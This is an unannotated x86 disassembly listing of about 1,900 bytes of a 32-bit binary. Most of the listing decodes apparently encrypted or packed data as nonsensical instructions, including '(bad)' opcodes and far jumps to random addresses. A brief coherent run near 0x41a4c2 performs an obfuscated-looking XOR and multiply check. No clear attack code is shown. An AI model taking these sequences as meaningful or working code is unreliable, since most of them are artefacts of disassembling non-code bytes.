  41a0de:	outs   dx,BYTE PTR ds:[esi]
  41a0df:	dec    edx
  41a0e0:	(bad)  
  41a0e1:	mov    eax,0xa86755f3
  41a0e6:	mov    dh,0x3a
  41a0e8:	push   eax
  41a0e9:	sbb    ch,BYTE PTR [esi]
  41a0eb:	xchg   edi,eax
  41a0ec:	lea    esp,[esi+0xdeee9f0]
  41a0f2:	jle    0x41a0aa
  41a0f4:	aas    
  41a0f5:	repz dec eax
  41a0f7:	lods   eax,DWORD PTR ds:[esi]
  41a0f8:	push   0x9e15db15
  41a0fd:	add    BYTE PTR [esi-0x786fbac3],cl
  41a103:	ficom  DWORD PTR [ebx+esi*1]
  41a106:	leave  
  41a107:	out    0x0,al
  41a109:	je     0x41a094
  41a10b:	jmp    0x41a091
  41a10d:	(bad)  
  41a10e:	out    dx,eax
  41a10f:	dec    ebx
  41a110:	out    dx,al
  41a111:	pop    esi
  41a112:	and    al,0xd9
  41a114:	sbb    esp,DWORD PTR [edi-0x44]
  41a117:	sbb    eax,0x736d4f6a
  41a11c:	iret   
  41a11d:	into   
  41a11e:	dec    ebp
  41a11f:	outs   dx,DWORD PTR ds:[esi]
  41a120:	gs xor eax,0x67a31ac7
  41a126:	imul   eax,ebp,0x56cdba78
  41a12c:	or     bl,al
  41a12e:	lds    ebx,FWORD PTR [esi+0x66c1e9f4]
  41a134:	pop    esp
  41a135:	dec    edx
  41a136:	jp     0x1aca1047
  41a13c:	and    bl,bh
  41a13e:	or     esp,edx
  41a140:	into   
  41a141:	jp     0x41a11b
  41a143:	mov    dh,0xe9
  41a145:	loopne 0x41a14b
  41a147:	aam    0xbb
  41a149:	dec    edi
  41a14a:	mov    es,WORD PTR [ebx+0x5bc57308]
  41a150:	pop    esp
  41a151:	xchg   esi,eax
  41a152:	or     ebx,DWORD PTR [ebx-0x657ee468]
  41a158:	push   esp
  41a159:	add    eax,0x2fadfec4
  41a15e:	inc    ecx
  41a15f:	adc    al,0x53
  41a161:	jp     0x41a0ed
  41a163:	sbb    edx,DWORD PTR [edx+esi*4+0x78d7d8b5]
  41a16a:	sub    DWORD PTR [ebx+0x4f],0x51
  41a16e:	aas    
  41a16f:	inc    esi
  41a170:	fimul  DWORD PTR [eax+0x9]
  41a173:	into   
  41a174:	in     eax,dx
  41a175:	test   BYTE PTR [esi],bl
  41a177:	sti    
  41a178:	ficomp DWORD PTR [eax-0x3e3c355]
  41a17e:	jp     0x41a152
  41a180:	fs pusha 
  41a182:	jle    0x41a18e
  41a184:	(bad)  
  41a185:	loopne 0x41a1d9
  41a187:	dec    edx
  41a188:	rcr    DWORD PTR [eax],cl
  41a18a:	nop
  41a18b:	add    al,0x8
  41a18d:	xchg   BYTE PTR [edi-0x646bea3b],dh
  41a193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a194:	mov    gs,ebx
  41a196:	push   es
  41a197:	and    ch,BYTE PTR [ebp+0x4b]
  41a19a:	fld    DWORD PTR [ebx-0xb]
  41a19d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a19e:	out    dx,al
  41a19f:	sub    al,0x6a
  41a1a1:	xor    esp,ebx
  41a1a3:	sbb    al,BYTE PTR [ecx+esi*2]
  41a1a6:	stos   BYTE PTR es:[edi],al
  41a1a7:	mov    edx,0xae6f14ba
  41a1ac:	sbb    edx,0xffffffac
  41a1af:	adc    bl,cl
  41a1b1:	xor    al,0x3b
  41a1b3:	sbb    eax,0x304192b0
  41a1b8:	jo     0x41a13a
  41a1ba:	icebp  
  41a1bb:	inc    ebx
  41a1bd:	in     eax,dx
  41a1be:	ins    BYTE PTR es:[edi],dx
  41a1bf:	push   ebp
  41a1c0:	test   eax,0x9c156122
  41a1c5:	out    0xad,eax
  41a1c7:	sbb    DWORD PTR [ebx+ebp*2],edi
  41a1ca:	pop    ebx
  41a1cb:	mov    ebx,0x4c583aba
  41a1d0:	mov    edi,0xb0660509
  41a1d5:	and    edi,edx
  41a1d7:	fcomp  QWORD PTR [edi+0x4602de2c]
  41a1dd:	xchg   dh,ch
  41a1df:	ror    esp,0xe8
  41a1e2:	into   
  41a1e3:	imul   ebx,DWORD PTR [edx-0x3eb2ebfb],0x35
  41a1ea:	push   es
  41a1eb:	push   ebp
  41a1ec:	sub    al,0x1
  41a1ee:	and    ebp,DWORD PTR [edx+0x4c]
  41a1f1:	adc    eax,0x36865f90
  41a1f6:	stos   BYTE PTR es:[edi],al
  41a1f7:	cmc    
  41a1f8:	js     0x41a1eb
  41a1fa:	imul   edi,DWORD PTR [edi],0xffffffb1
  41a1fd:	pusha  
  41a1fe:	jle    0x41a1fd
  41a200:	int3   
  41a201:	pop    ds
  41a202:	jp     0x41a1a8
  41a204:	mov    esp,0x80eeec7b
  41a209:	loop   0x41a1b0
  41a20b:	xchg   DWORD PTR [esi+ebx*8-0x2513e48a],esi
  41a212:	sbb    DWORD PTR [edx-0x6c254c5],edx
  41a218:	popa   
  41a219:	int    0xf3
  41a21b:	aaa    
  41a21c:	jae    0x41a203
  41a21e:	test   DWORD PTR [esi+0x40],0xac364210
  41a225:	pop    ds
  41a226:	xchg   edi,eax
  41a227:	test   BYTE PTR [esi],bh
  41a229:	jge    0x41a265
  41a22b:	data16 sub al,BYTE PTR [edx-0x1fd43858]
  41a232:	fs in  al,dx
  41a234:	(bad)  
  41a235:	idiv   BYTE PTR [eax]
  41a237:	leave  
  41a238:	stos   DWORD PTR es:[edi],eax
  41a239:	jecxz  0x41a28d
  41a23b:	stc    
  41a23c:	pop    dx
  41a23e:	and    eax,0x2a9659e0
  41a243:	add    BYTE PTR [edx+0x2b6c4633],0xa9
  41a24a:	push   ss
  41a24b:	inc    edi
  41a24c:	inc    eax
  41a24d:	icebp  
  41a24e:	or     esi,ebx
  41a250:	cdq    
  41a251:	inc    ebp
  41a252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a253:	mov    dh,0x8e
  41a255:	sub    dh,0x4e
  41a258:	imul   ecx,edi,0x297a012a
  41a25e:	jbe    0x41a2dc
  41a260:	fdivr  st(4),st
  41a262:	sti    
  41a263:	or     edx,ecx
  41a265:	or     esi,DWORD PTR [ebx]
  41a267:	enter  0x255c,0x50
  41a26b:	call   0x1d5af126
  41a270:	(bad)  
  41a271:	mov    esi,0xf62e494
  41a276:	(bad)  
  41a277:	aaa    
  41a278:	popa   
  41a279:	in     eax,dx
  41a27a:	(bad)  [eax+0x36]
  41a27d:	popa   
  41a27e:	dec    edx
  41a27f:	adc    ebp,DWORD PTR [ebx-0x7ce2b658]
  41a285:	jge    0x41a227
  41a287:	call   FWORD PTR [edx+eax*4+0x48]
  41a28b:	gs inc eax
  41a28d:	cmp    cl,BYTE PTR [ebp-0x15]
  41a290:	cli    
  41a291:	add    ebx,DWORD PTR [ebp+0x76]
  41a294:	fdiv   DWORD PTR [eax-0x683bb761]
  41a29a:	fucomip st,st(6)
  41a29c:	jnp    0x41a2ab
  41a29e:	out    0x93,eax
  41a2a0:	jecxz  0x41a22f
  41a2a2:	ficomp WORD PTR [esi]
  41a2a4:	jl     0x41a240
  41a2a6:	adc    BYTE PTR [ebp+0x4344bde4],al
  41a2ac:	adc    ch,BYTE PTR [ecx+0x6]
  41a2af:	and    edi,DWORD PTR [edx+esi*8]
  41a2b2:	jb     0x41a290
  41a2b4:	and    BYTE PTR fs:[esi-0x2e],dl
  41a2b8:	sbb    ah,0x34
  41a2bb:	xchg   ebp,eax
  41a2bc:	stos   BYTE PTR es:[edi],al
  41a2bd:	xor    ebx,DWORD PTR [edi]
  41a2bf:	outs   dx,DWORD PTR ds:[esi]
  41a2c0:	fidiv  WORD PTR [edi-0x61]
  41a2c3:	enter  0x200a,0x20
  41a2c7:	in     al,0xd4
  41a2c9:	or     ch,dl
  41a2cb:	sbb    ch,BYTE PTR [ebp+0x1658501d]
  41a2d1:	call   0xaaf056b4
  41a2d6:	retf   0x9939
  41a2d9:	mov    bh,0x88
  41a2db:	dec    ebx
  41a2dc:	mov    al,0x92
  41a2de:	repz sbb al,0xb
  41a2e1:	stc    
  41a2e2:	push   esp
  41a2e3:	icebp  
  41a2e4:	ret    0x94f7
  41a2e7:	dec    edx
  41a2e8:	stos   DWORD PTR es:[edi],eax
  41a2e9:	es enter 0x9eb,0xf4
  41a2ee:	mov    ah,0x50
  41a2f0:	cli    
  41a2f1:	push   eax
  41a2f2:	lock jge 0x41a2e1
  41a2f5:	mov    edi,0x53d29090
  41a2fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2fb:	stos   DWORD PTR es:[edi],eax
  41a2fc:	sbb    al,0x12
  41a2fe:	and    ch,ah
  41a300:	push   esi
  41a301:	push   ds
  41a302:	xchg   ecx,eax
  41a303:	loop   0x41a2ec
  41a305:	stc    
  41a306:	sbb    eax,0xd512d005
  41a30b:	sub    al,0x1a
  41a30d:	inc    ebx
  41a30e:	sahf   
  41a30f:	addr16 push esp
  41a311:	inc    edx
  41a312:	sbb    bl,BYTE PTR [eax+edi*4]
  41a315:	mov    ch,0x3b
  41a317:	call   0x1aba:0x24d51676
  41a31e:	je     0x41a323
  41a320:	sbb    ebp,DWORD PTR [esi+0x2d]
  41a323:	sbb    al,0xbe
  41a325:	xchg   eax,edi
  41a327:	and    ecx,DWORD PTR [ebx-0x1fe0a43f]
  41a32d:	xchg   ecx,eax
  41a32e:	div    eax
  41a330:	mov    ds:0x25523097,eax
  41a335:	inc    ebp
  41a336:	inc    ecx
  41a337:	shl    DWORD PTR [ebx],0x91
  41a33a:	jne    0x41a330
  41a33c:	loop   0x41a347
  41a33e:	and    edx,esi
  41a340:	mov    ebp,0x38343893
  41a345:	inc    ebx
  41a346:	xchg   ebp,eax
  41a347:	stos   BYTE PTR es:[edi],al
  41a348:	xor    BYTE PTR [esi+0x644a561],0xf3
  41a34f:	in     eax,0xc1
  41a351:	and    dl,ch
  41a353:	stos   DWORD PTR es:[edi],eax
  41a354:	and    ebp,esp
  41a356:	mov    ds:0x224fbe73,eax
  41a35b:	sbb    al,0xc6
  41a35d:	jnp    0x41a3b0
  41a35f:	mov    ah,0xde
  41a361:	push   ebp
  41a362:	(bad)  
  41a364:	(bad)  
  41a365:	iret   
  41a366:	gs cld 
  41a368:	shr    DWORD PTR [edx-0x23],0x3c
  41a36c:	je     0x41a366
  41a36e:	loop   0x41a351
  41a370:	shl    BYTE PTR [edi-0x67e29975],1
  41a376:	rol    DWORD PTR [esi],1
  41a378:	retf   0x7158
  41a37b:	dec    esi
  41a37c:	xor    DWORD PTR [edi-0x1af6525a],ebp
  41a382:	add    DWORD PTR [ebp-0x3],eax
  41a385:	jp     0x41a3c1
  41a387:	out    0x83,al
  41a389:	mov    bl,0x42
  41a38b:	inc    esp
  41a38c:	xor    DWORD PTR [ecx-0x5bd1002c],esi
  41a392:	aaa    
  41a393:	iret   
  41a394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a395:	sti    
  41a396:	mov    ?,WORD PTR [edx+ebx*4+0xf2844e]
  41a39d:	les    ebx,FWORD PTR [eax]
  41a39f:	mov    ah,0x8f
  41a3a1:	lahf   
  41a3a2:	cmc    
  41a3a3:	push   0xf7ba267d
  41a3a8:	sbb    dh,BYTE PTR [ecx-0x21]
  41a3ab:	add    al,0x1c
  41a3ae:	jne    0x41a367
  41a3b0:	repz imul edi,DWORD PTR [ebx],0x23
  41a3b4:	stos   DWORD PTR es:[edi],eax
  41a3b5:	jp     0x41a3f8
  41a3b7:	popa   
  41a3b8:	or     BYTE PTR [eax+0x4c53cfc5],bl
  41a3be:	inc    ebx
  41a3bf:	imul   ebp,DWORD PTR [ebp-0x26085003],0x436c0835
  41a3c9:	stos   DWORD PTR es:[edi],eax
  41a3ca:	stos   BYTE PTR es:[edi],al
  41a3cb:	popf   
  41a3cc:	lea    eax,[ecx-0x1b]
  41a3cf:	jne    0x41a361
  41a3d1:	xor    DWORD PTR [eax-0x1b],ecx
  41a3d4:	push   ds
  41a3d5:	lock sti 
  41a3d7:	dec    ebp
  41a3d8:	sub    ebx,DWORD PTR [ebx-0x3b]
  41a3db:	push   edi
  41a3dc:	sub    DWORD PTR [eax+0xa],esi
  41a3df:	dec    edx
  41a3e0:	dec    ebx
  41a3e1:	dec    esi
  41a3e2:	daa    
  41a3e3:	data16 jnp 0x41a3f0
  41a3e6:	xor    BYTE PTR [edx],dh
  41a3e8:	ret    
  41a3e9:	daa    
  41a3ea:	and    eax,0x4f15fc95
  41a3ef:	add    eax,0xfe44e27c
  41a3f4:	popf   
  41a3f5:	mov    eax,ds:0xb401ce8e
  41a3fa:	cmp    edi,DWORD PTR [eax-0x2a]
  41a3fd:	ret    
  41a3fe:	jnp    0x41a389
  41a400:	int3   
  41a401:	dec    ebp
  41a402:	rcl    BYTE PTR [ecx],0x32
  41a405:	(bad)  
  41a406:	xchg   ecx,eax
  41a407:	test   eax,0xa38f7293
  41a40c:	or     BYTE PTR [edi-0x775ba718],0x70
  41a413:	out    dx,al
  41a414:	mov    DWORD PTR [ecx],ecx
  41a416:	cmp    bl,BYTE PTR [edi]
  41a418:	(bad)  
  41a419:	out    dx,eax
  41a41a:	dec    esi
  41a41b:	push   ebp
  41a41c:	scas   eax,DWORD PTR es:[edi]
  41a41d:	aaa    
  41a41e:	jle    0x41a3fc
  41a420:	pop    es
  41a421:	call   0x17b441fa
  41a426:	adc    DWORD PTR [eax+0x18],ecx
  41a429:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a42a:	push   eax
  41a42b:	ins    BYTE PTR es:[edi],dx
  41a42c:	rcr    ecx,0xc0
  41a42f:	std    
  41a430:	sub    DWORD PTR [edx],esp
  41a432:	rol    DWORD PTR [edx+0x67],cl
  41a435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a436:	addr16 mov ch,0x44
  41a439:	test   al,0x5
  41a43b:	xchg   ecx,eax
  41a43c:	cwde   
  41a43d:	repz pop ebp
  41a43f:	sbb    bh,dh
  41a441:	push   ebp
  41a442:	xchg   DWORD PTR [edi],ebx
  41a444:	lds    edx,FWORD PTR [edi-0x30bf6c39]
  41a44a:	inc    esp
  41a44b:	mov    ah,0xd4
  41a44d:	mov    ebx,0x29a5b4c1
  41a452:	mov    dh,0x66
  41a454:	xchg   BYTE PTR [ebx-0x31],cl
  41a457:	mov    ecx,0x11fca6b6
  41a45c:	inc    esi
  41a45d:	inc    edi
  41a45e:	jmp    0x10e7:0x29cada7
  41a465:	bnd jne 0x41a40c
  41a468:	fsubr  DWORD PTR [esi+0x7]
  41a46b:	aad    0xd0
  41a46d:	mov    cl,0x9f
  41a46f:	jecxz  0x41a42a
  41a471:	push   ds
  41a472:	cmc    
  41a473:	sub    edi,DWORD PTR [edi+0x7b]
  41a476:	(bad)  
  41a477:	adc    DWORD PTR [ecx],edi
  41a479:	xor    al,BYTE PTR [esi]
  41a47b:	mov    ?,WORD PTR [ecx-0x6327a32e]
  41a481:	fiadd  DWORD PTR [eax-0x38022260]
  41a487:	hlt    
  41a488:	or     eax,0xb23dc487
  41a48d:	push   0x1
  41a48f:	(bad)  
  41a490:	or     al,0x4b
  41a492:	retf   
  41a493:	jge    0x41a502
  41a495:	dec    ebp
  41a496:	jl     0x41a462
  41a498:	dec    esi
  41a499:	stc    
  41a49a:	pop    eax
  41a49b:	jo     0x41a4fb
  41a49d:	lahf   
  41a49e:	cmp    ebx,DWORD PTR [edi-0x12de8dc3]
  41a4a4:	popa   
  41a4a5:	cmp    BYTE PTR [eax],dl
  41a4a7:	out    0x1a,eax
  41a4a9:	sahf   
  41a4aa:	mov    WORD PTR [edx-0x4c96b2d],ss
  41a4b0:	outs   dx,DWORD PTR ds:[esi]
  41a4b1:	shr    BYTE PTR [edi+0x3f23374],0xc1
  41a4b8:	add    esi,ecx
  41a4ba:	imul   eax,esi
  41a4bd:	jmp    0x41c8af
  41a4c2:	mov    eax,DWORD PTR [ebp+0xc]
  41a4c5:	mov    eax,DWORD PTR [eax+0x78]
  41a4c8:	mov    DWORD PTR [ebp+0xc],eax
  41a4cb:	mov    eax,DWORD PTR [ebp-0x4]
  41a4ce:	mov    esi,DWORD PTR [ebp-0x8]
  41a4d1:	xor    eax,edx
  41a4d3:	xor    esi,edx
  41a4d5:	add    eax,ecx
  41a4d7:	add    esi,ecx
  41a4d9:	imul   eax,esi
  41a4dc:	mov    esi,DWORD PTR [ebp+0xc]
  41a4df:	cmp    esi,eax
  41a4e1:	mov    eax,DWORD PTR [ebp-0x4]
  41a4e4:	je     0x4180fd
  41a4ea:	xor    eax,edx
  41a4ec:	jmp    0x41c89e
  41a4f1:	aaa    
  41a4f2:	dec    eax
  41a4f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4f4:	sbb    DWORD PTR [edi-0x67],esp
  41a4f7:	xchg   DWORD PTR [eax],ebp
  41a4f9:	and    bl,BYTE PTR [ecx+eiz*8+0x1b6d92ab]
  41a500:	mov    edx,0x62610048
  41a505:	int    0x5f
  41a507:	bound  esp,QWORD PTR [edx+0x74]
  41a50a:	adc    DWORD PTR [edx],edi
  41a50c:	jae    0x41a559
  41a50e:	retf   
  41a50f:	aas    
  41a510:	neg    DWORD PTR [ecx-0x4f]
  41a513:	xor    ch,BYTE PTR [eax-0x20]
  41a516:	aam    0x6e
  41a518:	das    
  41a519:	(bad)  
  41a51b:	jb     0x41a578
  41a51d:	add    al,0x59
  41a51f:	dec    ebp
  41a520:	sbb    al,0x7d
  41a522:	xor    al,0x8e
  41a524:	xchg   esi,eax
  41a525:	pusha  
  41a526:	jno    0x41a52a
  41a528:	jmp    0x41a594
  41a52a:	jno    0x41a50d
  41a52c:	(bad)  
  41a52d:	xchg   ebx,eax
  41a52e:	or     DWORD PTR [ebx],ecx
  41a530:	std    
  41a531:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a532:	sti    
  41a533:	cld    
  41a534:	sbb    BYTE PTR [edi-0x3b],bl
  41a537:	sub    al,0x9a
  41a539:	loopne 0x41a50f
  41a53b:	call   0xdb9a:0x7ba2d883
  41a542:	cmp    BYTE PTR [edx+0x59e2ed93],dl
  41a548:	loope  0x41a5b7
  41a54a:	stos   BYTE PTR es:[edi],al
  41a54b:	sbb    esi,DWORD PTR [ebx+0x4d96f025]
  41a551:	pusha  
  41a552:	or     al,0x36
  41a554:	out    0xdf,al
  41a556:	jae    0x41a4ec
  41a558:	popa   
  41a559:	mov    ch,bl
  41a55b:	(bad)  
  41a55c:	ret    0x92fc
  41a55f:	stos   BYTE PTR es:[edi],al
  41a560:	pop    esp
  41a561:	dec    edi
  41a562:	aad    0x71
  41a564:	mov    eax,ds:0xea846f34
  41a569:	imul   esp,DWORD PTR [ecx-0x18],0x50bbcef1
  41a570:	fs (bad) 
  41a572:	jmp    0xd4be:0x21499b83
  41a579:	addr16 dec ebp
  41a57b:	outs   dx,DWORD PTR ds:[esi]
  41a57c:	or     ecx,ecx
  41a57e:	push   0x1b2e5da1
  41a583:	dec    esi
  41a584:	sub    cl,ch
  41a586:	and    bh,bh
  41a588:	or     al,0xc3
  41a58a:	pop    edi
  41a58b:	pop    ecx
  41a58c:	inc    BYTE PTR [esi]
  41a58e:	(bad)  
  41a590:	mov    al,ds:0xdc34c8b2
  41a595:	inc    ebp
  41a596:	xor    eax,0xf32b0c72
  41a59b:	dec    ebx
  41a59c:	push   cs
  41a59d:	(bad)  
  41a59f:	pop    ecx
  41a5a0:	xor    esp,DWORD PTR [esi+ebx*8]
  41a5a3:	clc    
  41a5a4:	sbb    bl,BYTE PTR [ebp-0x62bd7bb1]
  41a5aa:	jae    0x41a5a6
  41a5ac:	mov    WORD PTR [ecx+ebp*8-0x6c],gs
  41a5b0:	jae    0x41a5c3
  41a5b2:	sub    al,0xa0
  41a5b4:	ficom  DWORD PTR [esi+0x29]
  41a5b7:	mov    edi,0x5196a008
  41a5bc:	mov    ch,BYTE PTR [si]
  41a5bf:	xchg   esi,eax
  41a5c0:	stc    
  41a5c1:	xchg   al,ch
  41a5c3:	scas   al,BYTE PTR es:[edi]
  41a5c4:	sti    
  41a5c5:	adc    DWORD PTR [edi+0x66],0xffffff85
  41a5c9:	lock xchg DWORD PTR [edi],ebp
  41a5cc:	and    edx,DWORD PTR [edi+esi*1+0x12]
  41a5d0:	pusha  
  41a5d1:	dec    ecx
  41a5d2:	xchg   esi,eax
  41a5d3:	(bad)  
  41a5d4:	pop    es
  41a5d5:	jne    0x41a5a3
  41a5d7:	pop    esp
  41a5d8:	mov    edx,0x4fe023e4
  41a5dd:	jmp    0x65c175e6
  41a5e2:	popa   
  41a5e3:	or     eax,0xa8681e5c
  41a5e8:	mov    ecx,0x5e41375b
  41a5ed:	xlat   BYTE PTR ds:[ebx]
  41a5ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5ef:	jl     0x41a5f5
  41a5f1:	popa   
  41a5f2:	or     al,0xa2
  41a5f4:	cmp    edx,ebx
  41a5f6:	mov    edx,0x1543e3dc
  41a5fb:	arpl   WORD PTR [edi],bp
  41a5fd:	push   esi
  41a5fe:	call   0x46d8:0x53d8325f
  41a605:	mov    ds:0xe611e335,eax
  41a60a:	or     ecx,edx
  41a60c:	or     eax,0x604e8e6a
  41a611:	xlat   BYTE PTR ds:[ebx]
  41a612:	pop    edi
  41a613:	mov    ebp,0xc74f0b08
  41a618:	inc    ecx
  41a619:	jo     0x41a612
  41a61b:	sar    esp,cl
  41a61d:	jmp    0x94d5:0xff4e3d1c
  41a624:	iret   
  41a625:	jecxz  0x41a639
  41a627:	test   DWORD PTR [ecx],esp
  41a629:	call   0x6a30:0x7d65106e
  41a630:	fwait
  41a631:	mov    edx,0x762733d6
  41a636:	mov    ss,WORD PTR [ebx+0x75]
  41a639:	shr    DWORD PTR [esi],1
  41a63b:	inc    ebp
  41a63c:	push   ss
  41a63d:	jecxz  0x41a5e4
  41a63f:	sbb    dh,BYTE PTR [edx]
  41a641:	jnp    0x41a69c
  41a643:	icebp  
  41a644:	pusha  
  41a645:	pop    esp
  41a646:	add    DWORD PTR [edx+ecx*2+0x65281f3b],esp
  41a64d:	or     DWORD PTR [edx-0x79],edi
  41a650:	and    DWORD PTR [esi+0x6c],eax
  41a653:	nop
  41a654:	aas    
  41a655:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a656:	push   es
  41a657:	push   cs
  41a658:	ins    DWORD PTR es:[edi],dx
  41a659:	dec    ebp
  41a65a:	mov    edx,0x24e6eab7
  41a65f:	sbb    DWORD PTR [ebx],edx
  41a661:	sub    DWORD PTR [edi-0x65b0eb7],0x39
  41a668:	jge    0x41a5f2
  41a66a:	dec    ebp
  41a66b:	mov    ds:0xdb792b8a,al
  41a670:	dec    eax
  41a671:	pop    ecx
  41a672:	cmp    dh,BYTE PTR [ebx+0x16197376]
  41a678:	inc    edi
  41a679:	mov    edi,0xc8076564
  41a67e:	pop    esi
  41a67f:	in     eax,0x75
  41a681:	out    0xbe,al
  41a683:	or     al,0x57
  41a685:	lods   eax,DWORD PTR ds:[esi]
  41a686:	mov    dh,0xf0
  41a688:	mov    BYTE PTR [eax-0x70a3d87e],ah
  41a68e:	div    cl
  41a690:	dec    esi
  41a691:	enter  0xce5e,0x45
  41a695:	mov    al,ds:0x953baa6d
  41a69a:	add    eax,0xbe81d294
  41a69f:	aad    0x9e
  41a6a1:	mov    ?,WORD PTR [ebx+0x3606b737]
  41a6a7:	es sbb dh,bh
  41a6aa:	mov    edx,0xa904bf4a
  41a6af:	sbb    DWORD PTR [esi],0x5131d05
  41a6b5:	repz (bad) 
  41a6b8:	out    0x62,eax
  41a6ba:	cwde   
  41a6bb:	or     DWORD PTR [eax-0x596f6a5c],esp
  41a6c1:	stos   BYTE PTR es:[edi],al
  41a6c2:	repnz inc edi
  41a6c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6c5:	pop    dx
  41a6c7:	adc    al,0x3f
  41a6c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6ca:	int3   
  41a6cb:	int    0xd7
  41a6cd:	mov    WORD PTR [eax+0x11],ds
  41a6d0:	iret   
  41a6d1:	mov    edx,0xfec08ff2
  41a6d6:	fnsave [edi-0x6fb07649]
  41a6dc:	iret   
  41a6dd:	shl    DWORD PTR [edi],1
  41a6df:	fcmovnbe st,st(4)
  41a6e1:	inc    esp
  41a6e2:	xchg   ebx,eax
  41a6e3:	pop    es
  41a6e4:	rcr    BYTE PTR gs:[esp+edx*8+0x74],0xac
  41a6ea:	adc    esi,DWORD PTR [ebp+0x78]
  41a6ed:	inc    eax
  41a6ee:	add    DWORD PTR [edi],edx
  41a6f0:	xor    BYTE PTR [esi-0x1df2f549],ah
  41a6f6:	(bad)  
  41a6f7:	dec    edx
  41a6f8:	pushf  
  41a6f9:	shl    BYTE PTR [esi],1
  41a6fb:	cld    
  41a6fc:	std    
  41a6fd:	(bad)  
  41a6fe:	enter  0x9c2,0xf2
  41a702:	mov    eax,0x5e9d7008
  41a707:	ror    DWORD PTR [edx],cl
  41a709:	jb     0x41a75c
  41a70b:	hlt    
  41a70c:	jnp    0x41a741
  41a70e:	dec    ebx
  41a70f:	xchg   ebp,eax
  41a710:	push   esp
  41a711:	xchg   esi,eax
  41a712:	xchg   esp,eax
  41a713:	(bad)  
  41a714:	rcr    DWORD PTR [edi],cl
  41a716:	loop   0x41a6cc
  41a718:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a719:	xchg   esi,eax
  41a71a:	push   0xc10854e8
  41a71f:	test   BYTE PTR [esi+ebx*8-0x5da70125],dh
  41a726:	pusha  
  41a727:	neg    DWORD PTR [eax+0x79]
  41a72a:	pop    ebx
  41a72b:	ins    DWORD PTR es:[edi],dx
  41a72c:	shl    ecx,0x57
  41a72f:	repnz jmp 0x2531:0x55dcb918
  41a737:	mov    ah,0x5a
  41a739:	adc    bl,dl
  41a73b:	jo     0x41a702
  41a73d:	js     0x41a7bc
  41a73f:	pop    esi
  41a740:	pop    ebx
  41a741:	(bad)  
  41a742:	jne    0x41a7c2
  41a744:	sbb    DWORD PTR [esi],edx
  41a746:	mov    al,0xf3
  41a748:	jle    0x41a775
  41a74a:	retf   0x4631
  41a74d:	test   ah,ch
  41a74f:	inc    ebp
  41a750:	mov    ds:0x857da223,eax
  41a755:	or     bh,ah
  41a757:	rol    DWORD PTR [ecx-0x41],1
  41a75a:	xchg   ecx,eax
  41a75b:	jmp    0x5af34534
  41a760:	ret    0xdc7c
  41a763:	imul   esp,DWORD PTR [edx-0x59],0x46
  41a767:	mov    ah,0x6
  41a769:	aam    0x9b
  41a76b:	enter  0xcbb1,0xa4
  41a76f:	in     eax,0xc3
  41a771:	or     dh,cl
  41a773:	loopne 0x41a7ae
  41a775:	dec    ebx
  41a776:	fiadd  DWORD PTR [eax+0x40]
  41a779:	mov    ds:0xf5d7a59d,al
  41a77e:	fsub   QWORD PTR [ecx]
  41a780:	ja     0x41a789
  41a782:	push   ebx
  41a783:	jb     0x41a7d1
  41a785:	jl     0x41a718
  41a787:	sbb    dh,BYTE PTR [ebp-0x3ebec430]
  41a78d:	stos   BYTE PTR es:[edi],al
  41a78e:	loope  0x41a7a7
  41a790:	pop    ebp
  41a791:	jmp    0x6881:0x6c3712c3
  41a798:	mov    edx,0x804f39b
  41a79d:	jle    0x41a7a5
  41a79f:	addr16 cmp esp,esi
  41a7a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7a3:	gs pusha 
  41a7a5:	fdiv   st,st(4)
  41a7a7:	(bad)  
  41a7a8:	pcmpeqw mm1,mm1
  41a7ab:	dec    esp
  41a7ac:	xchg   ebp,eax
  41a7ad:	sub    BYTE PTR [ebx-0x2e],dh
  41a7b0:	cmp    bh,0x10
  41a7b3:	adc    dl,BYTE PTR [eax+ebx*1-0x76705f8]
  41a7ba:	xchg   ebx,eax
  41a7bb:	test   DWORD PTR ds:0x3801d19f,edx
  41a7c1:	xor    eax,0x21cc97b4
  41a7c6:	pop    ss
  41a7c7:	aam    0xb9
  41a7c9:	cmp    eax,0xf1e7a7a4
  41a7ce:	ret    0x979e
  41a7d1:	mov    cl,0x11
  41a7d3:	cli    
  41a7d4:	sbb    bh,BYTE PTR [ebp-0x38]
  41a7d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7d8:	lods   al,BYTE PTR fs:[esi]
  41a7da:	(bad)  
  41a7db:	xor    BYTE PTR [esi-0x60],ch
  41a7de:	cs mov bh,0xc8
  41a7e1:	daa    
  41a7e2:	mov    ebx,0xe2888ec9
  41a7e7:	jle    0x41a7ae
  41a7e9:	sbb    DWORD PTR [eax-0x65],eax
  41a7ec:	(bad)  
  41a7ed:	push   ebx
  41a7ee:	push   ecx
  41a7ef:	and    ch,BYTE PTR [eax+0x8683415]
  41a7f5:	sub    al,0x93
  41a7f7:	pop    es
  41a7f8:	xchg   esi,eax
  41a7f9:	jp     0x41a7d4
  41a7fb:	xor    DWORD PTR [eax+0x45],edi
  41a7fe:	push   0x4efa6477
  41a803:	jp     0x41a808
  41a805:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a806:	pop    esp
  41a807:	jp     0x41a833
  41a809:	add    al,0x36
  41a80b:	fwait
  41a80c:	xchg   BYTE PTR [esi+0x2a],cl
  41a80f:	(bad)  
  41a810:	(bad)  
  41a811:	lds    esp,FWORD PTR [edx+0x532a3dac]
  41a817:	mov    esi,0x895d8c93
  41a81c:	adc    eax,0xceccece3
  41a821:	dec    edx
  41a822:	mov    edi,0xbc556595
  41a827:	add    cl,cl
  41a829:	sbb    DWORD PTR [esi+0x3],ebp
